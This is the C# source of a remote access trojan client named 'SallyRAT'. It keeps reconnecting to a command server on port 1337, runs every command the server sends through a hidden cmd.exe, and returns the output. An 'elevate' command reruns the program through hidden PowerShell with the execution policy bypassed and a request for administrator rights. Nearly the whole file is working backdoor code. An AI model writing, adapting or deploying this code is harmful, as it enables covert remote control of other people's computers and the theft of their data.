using System;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace clientSallyRAT
{
    class Client
    {
        static void Main(string[] args)
        {
            TcpClient client = null; // Variables for TcpClient, NetworkStream, StreamReader, and StreamWriter
            NetworkStream stream = null;
            StreamReader reader = null;
            StreamWriter writer = null;

            while (client == null || !client.Connected) // Attempt to connect to the server
            {
                try
                {
                    Console.WriteLine("Attempting to connect to SallyRAT");
                    client = new TcpClient();
                    client.Connect("127.0.0.1", 1337);

                    stream = client.GetStream();
                    reader = new StreamReader(stream);
                    writer = new StreamWriter(stream) { AutoFlush = true };

                    Console.WriteLine("YAYYYYY WE HAVE CONNECTED TO SERVER");
                }
                catch (Exception ex) // If connection fails, log the error and retry after 5 seconds
                {
                    Console.WriteLine("Failed to connect to SallyRAT");
                    Console.WriteLine(ex.Message);
                    Console.WriteLine("Trying Again In 5 Seconds.");
                    Thread.Sleep(5000);
                }
            }

            try
            {
                while (client.Connected) // This loop runs as long as the client is connected to the server
                {
                    string command = reader.ReadLine();
                    Console.WriteLine($"Received command: {command}"); // Log the received command

                    if (string.IsNullOrEmpty(command)) continue;

                    if (command.ToLower() == "elevate")
                    {
                        ElevateToAdmin(); // Perform elevation to admin rights
                        continue;
                    }

                    Process process = new Process(); // Start a process to run cmd.exe and execute the command from the server
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = "/c " + command;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();

                    string output;
                    while ((output = process.StandardOutput.ReadLine()) != null)
                    {
                        writer.WriteLine(output); // Send the output back to the server
                    }
                    writer.WriteLine("END_OF_OUTPUT"); // Indicate the end of the output
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"Error: {e.Message}"); // Log any errors
            }
            finally
            {
                writer.Close();
                reader.Close();
                stream.Close();
                client.Close();
            }
        }

        static void ElevateToAdmin()
        {
            try
            {
                // Get the path of the current executable
                string exePath = Process.GetCurrentProcess().MainModule.FileName;

                // Execute command with PowerShell for elevation
                string command = $"-NoProfile -ExecutionPolicy Bypass -Command \"& {{Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command {exePath}'}}\"";
                ProcessStartInfo processInfo = new ProcessStartInfo("powershell", $"{command}");
                Console.WriteLine($"Command to elevate: powershell {command}"); // Log the elevation command
                processInfo.CreateNoWindow = true;
                processInfo.UseShellExecute = false;
                processInfo.WindowStyle = ProcessWindowStyle.Hidden;
                Process process = new Process();
                process.StartInfo = processInfo;
                process.Start();
                process.WaitForExit();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error elevating to admin: {ex.Message}"); // Log any errors during elevation
            }
        }
    }
}
